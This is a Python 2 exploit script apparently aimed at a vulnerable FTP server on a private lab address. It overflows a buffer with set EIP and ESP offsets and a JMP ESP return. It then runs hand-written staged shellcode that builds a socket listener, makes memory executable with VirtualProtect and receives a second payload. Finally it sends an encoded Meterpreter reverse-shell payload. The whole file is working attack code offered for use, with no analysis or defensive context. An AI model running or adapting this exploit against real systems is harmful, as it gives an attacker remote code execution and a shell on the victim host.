#!/usr/bin/python
import socket
from struct import pack
from time import sleep

host = '172.16.192.168'
port = 21

max = 365
eip_offset = 294
esp_offset = 302
start_offset = 266
jmp_esp = pack("<L", 0x7e4456f7)

def fuzz(payload, port, recv=True):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, port))
  if recv:
    s.recv(2048)
  s.send(payload)
  s.shutdown
  s.close

rev_met_7887 =  ""
rev_met_7887 += "\xd9\xeb\xd9\x74\x24\xf4\xbf\x39\x99\x73\xab"
rev_met_7887 += "\x5a\x31\xc9\xb1\x56\x83\xea\xfc\x31\x7a\x14"
rev_met_7887 += "\x03\x7a\x2d\x7b\x86\x57\xa5\xf9\x69\xa8\x35"
rev_met_7887 += "\x9e\xe0\x4d\x04\x9e\x97\x06\x36\x2e\xd3\x4b"
rev_met_7887 += "\xba\xc5\xb1\x7f\x49\xab\x1d\x8f\xfa\x06\x78"
rev_met_7887 += "\xbe\xfb\x3b\xb8\xa1\x7f\x46\xed\x01\xbe\x89"
rev_met_7887 += "\xe0\x40\x87\xf4\x09\x10\x50\x72\xbf\x85\xd5"
rev_met_7887 += "\xce\x7c\x2d\xa5\xdf\x04\xd2\x7d\xe1\x25\x45"
rev_met_7887 += "\xf6\xb8\xe5\x67\xdb\xb0\xaf\x7f\x38\xfc\x66"
rev_met_7887 += "\x0b\x8a\x8a\x78\xdd\xc3\x73\xd6\x20\xec\x81"
rev_met_7887 += "\x26\x64\xca\x79\x5d\x9c\x29\x07\x66\x5b\x50"
rev_met_7887 += "\xd3\xe3\x78\xf2\x90\x54\xa5\x03\x74\x02\x2e"
rev_met_7887 += "\x0f\x31\x40\x68\x13\xc4\x85\x02\x2f\x4d\x28"
rev_met_7887 += "\xc5\xa6\x15\x0f\xc1\xe3\xce\x2e\x50\x49\xa0"
rev_met_7887 += "\x4f\x82\x32\x1d\xea\xc8\xde\x4a\x87\x92\xb6"
rev_met_7887 += "\xbf\xaa\x2c\x46\xa8\xbd\x5f\x74\x77\x16\xc8"
rev_met_7887 += "\x34\xf0\xb0\x0f\x4d\x16\x43\xdf\xf5\x77\xbd"
rev_met_7887 += "\xe0\x05\x51\x7a\xb4\x55\xc9\xab\xb5\x3e\x09"
rev_met_7887 += "\x53\x60\xaa\x03\xc3\x27\x3a\xd4\xc5\x50\x38"
rev_met_7887 += "\xd4\xf7\x6f\xb5\x32\x57\x20\x95\xea\x18\x90"
rev_met_7887 += "\x55\x5b\xf1\xfa\x5a\x84\xe1\x04\xb1\xad\x88"
rev_met_7887 += "\xea\x6f\x85\x24\x92\x2a\x5d\xd4\x5b\xe1\x1b"
rev_met_7887 += "\xd6\xd0\x03\xdb\x99\x10\x66\xcf\xce\x46\x88"
rev_met_7887 += "\x0f\x0f\xe3\x88\x65\x0b\xa5\xdf\x11\x11\x90"
rev_met_7887 += "\x17\xbe\xea\xf7\x24\xb9\x15\x86\x1c\xb1\x20"
rev_met_7887 += "\x1c\x20\xad\x4c\xf0\xa0\x2d\x1b\x9a\xa0\x45"
rev_met_7887 += "\xfb\xfe\xf3\x70\x04\x2b\x60\x29\x91\xd4\xd0"
rev_met_7887 += "\x9d\x32\xbd\xde\xf8\x75\x62\x21\x2f\x06\x65"
rev_met_7887 += "\xdd\xad\x21\xce\xb5\x4d\x72\xee\x45\x24\x72"
rev_met_7887 += "\xbe\x2d\xb3\x5d\x31\x9d\x3c\x74\x1a\xb5\xb7"
rev_met_7887 += "\x19\xe8\x24\xc7\x33\xac\xf8\xc8\xb0\x75\x0b"
rev_met_7887 += "\xb2\xb9\x8a\xec\x43\xd0\xee\xed\x43\xdc\x10"
rev_met_7887 += "\xd2\x95\xe5\x66\x15\x26\x52\x78\x20\x0b\xf3"
rev_met_7887 += "\x13\x4a\x1f\x03\x36"

###################### SOCKET(2,1,6) ###################################
block1 = "\x83\xEC\x7C"           # SUB ESP,7C; 
block1 += "\xBB\x44\x34\x34\x40"  # MOV EBX,40343444
block1 += "\xC1\xEB\x08"          # SHR EBX,8
block1 += "\xB0\x06\x50"          # MOV AL,6; PUSH EAX
block1 += "\xB0\x01\x50"          # MOV AL,1; PUSH EAX
block1 += "\x40\x50"          # MOV AL,2; PUSH EAX
block1 += "\xFF\xD3"              # CALL EBX - 

###################### BIND(Handle:EDI,SocketAddr:ECX,Length:10) ########
block1 += "\x8B\xF8"              # MOV EDI,EAX
block1 += "\x8B\xCB"              # MOV ECX,EBX
block1 += "\xB5\x74"              # MOV CH,74; GET SOCKET ADDR 
block1 += "\xFE\x41\x03"          # INC BYTE PTR DS:[ECX+3]; Incr Port #
block1 += "\xB3\x54"              # MOV BL,54; Points to Bind; 
block1 += "\x6A\x10"              # PUSH 10
block1 += "\x51"                  # PUSH ECX
block1 += "\x57"                  # PUSH EDI
block1 += "\xFF\xD3" 

###################### Listen(Backlog, Handler) ########################## 
block1 += "\xB3\x5C"              # MOV BL,5C
block1 += "\x6A\x7F"              # PUSH 7F
block1 += "\x57"                  # PUSH EDI
block1 += "\xFF\xD3"              # CALL EBX

###################### Accept(Handler, NULL, NULL) ########################
block1 += "\xB3\x24"              # MOV BL,24
block1 += "\x57"                  # PUSH EDI
block1 += "\xFF\xD3"              # CALL EBX

###################### Malloc(Handler, NULL, NULL) ######################## 

block1 += "\x8B\xF8"              # MOV EDI,EAX
block1 += "\x66\xBB\xD4\x3D"      # MOV BX,3DD4
block1 += "\x8A\xE0"              # MOV AH, AL ; Size Fudging for Malloc
block1 += "\x50"                  # PUSH EAX
block1 += "\xFF\xD3"              # CALL EBX; 
block1 += "\xEB\x9D"              # JMP to block2 

###################### VirtualProtect ######################## 
block2 = "\x59"                   #    POP ECX
block2 += "\x51"                  #    PUSH ECX
block2 += "\x8B\xF0"              #    MOV ESI,EAX
block2 += "\x50"                  #    PUSH EAX
block2 += "\x66\xBB\xA4\x3E"      #    MOV BX,3EA4
block2 += "\x8D\x44\x24\xDC"      #    LEA EAX,DWORD PTR SS:[ESP+24]
block2 += "\x50"                  #    PUSH EAX
block2 += "\x6A\x40"              #    PUSH 40
block2 += "\x51"                  #    PUSH ECX
block2 += "\x56"                  #    PUSH ESI
block2 += "\xFF\xD3"              #    CALL EBX

###################### Recv ######################## 
block2 += "\x66\xBB\xDC\x82"                   # MOV BX, 0x82DC
block2 += "\x57" 
block2 += "\xEB\x05"

tucked = "\xFF\x13"
tucked += "\xFF\xE6"

payload = "Z" * start_offset
payload += block2
payload += "D" * (eip_offset - len(payload))
payload += jmp_esp
payload += tucked 
payload += block1
payload += "E" * (max - len(payload))

print "[*] payload {0} chars...".format(len(payload))
fuzz(payload, port)
sleep(1)
fuzz(rev_met_7887, port+1, False)

# 00403434   $-FF25 E4824000  JMP DWORD PTR DS:[<&WS2_32.socket>]      ;  WS2_32.socket (2, 1 ,6)
# 00403454   $-FF25 B8824000  JMP DWORD PTR DS:[<&WS2_32.bind>]        ;  WS2_32.bind
# 0040345C   $-FF25 D4824000  JMP DWORD PTR DS:[<&WS2_32.listen>]      ;  WS2_32.listen
# 00403424   $-FF25 B4824000  JMP DWORD PTR DS:[<&WS2_32.accept>]      ;  WS2_32.accept
# 0040340C   $-FF25 DC824000  JMP DWORD PTR DS:[<&WS2_32.recv>]        ;  WS2_32.recv
# 00403DD4   $-FF25 70824000  JMP DWORD PTR DS:[<&msvcrt.malloc>]      ;  msvcrt.malloc
# 00403EA4   $-FF25 E4814000  JMP DWORD PTR DS:[<&KERNEL32.VirtualProt>;  kernel32.VirtualProtect






